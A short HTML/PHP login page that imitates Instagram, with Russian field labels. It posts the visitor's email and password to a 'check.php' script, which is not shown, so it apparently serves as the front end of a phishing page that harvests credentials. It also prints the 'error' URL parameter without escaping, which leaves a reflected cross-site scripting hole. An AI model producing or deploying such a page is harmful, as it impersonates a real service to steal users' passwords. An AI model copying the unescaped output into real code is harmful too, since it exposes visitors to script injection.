<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="utf-8">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
</head>
<body>
	<div class="col-3 mx-auto mt-4 text-center">
		<h6>Instagram</h6>
		<form action="check.php" method="POST">
			<input type="" name="mail" placeholder="Эл. адрес" class="mb-1 form-control">
			<input type="password" name="pass" placeholder="Пароль" class="mb-2 form-control">
			<button class="btn btn-primary form-control">Войти</button>
		</form>
		<p>
			<?php echo $_GET['error'] ?>
		</p>
	</div>
</body>
</html>